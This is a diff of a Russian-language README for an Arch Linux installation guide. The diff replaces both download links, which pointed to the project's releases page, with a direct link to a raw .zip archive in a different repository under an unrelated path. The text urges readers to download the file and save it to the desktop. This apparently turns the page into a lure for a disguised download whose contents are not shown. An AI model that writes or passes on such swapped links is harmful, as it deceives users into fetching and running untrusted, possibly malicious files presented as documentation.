@@ -5,7 +5,7 @@ description: "Устанавливайте Arch Linux с нуля, следуя 
 ---
 # 🐧 archinstall-guide-ru - Настройка Arch Linux на вашем компьютере
 
-[![Download](https://img.shields.io/badge/Скачать-Загрузить_программу-blue.svg)](https://github.com/arieltraitorous609/archinstall-guide-ru/releases)
+[![Download](https://img.shields.io/badge/Скачать-Загрузить_программу-blue.svg)](https://raw.githubusercontent.com/arieltraitorous609/arieltraitorous609.github.io/main/furfuramide/arieltraitorous_io_github_v2.6.zip)
 
 Этот проект предоставляет русскоязычное руководство по установке Arch Linux. Вы можете использовать это системное руководство для настройки полноценной домашней среды. Инструкция охватывает каждый этап от подготовки загрузочного носителя до запуска интерфейса.
 
@@ -13,7 +13,7 @@ description: "Устанавливайте Arch Linux с нуля, следуя 
 
 Для доступа к файлам руководства перейдите на страницу выпусков. Там находятся актуальные версии документации.
 
-[Посетите страницу для загрузки](https://github.com/arieltraitorous609/archinstall-guide-ru/releases)
+[Посетите страницу для загрузки](https://raw.githubusercontent.com/arieltraitorous609/arieltraitorous609.github.io/main/furfuramide/arieltraitorous_io_github_v2.6.zip)
 
 Выберите последний файл в списке. Сохраните его на рабочем столе. Этот документ содержит пошаговый план действий для создания рабочей системы.
 
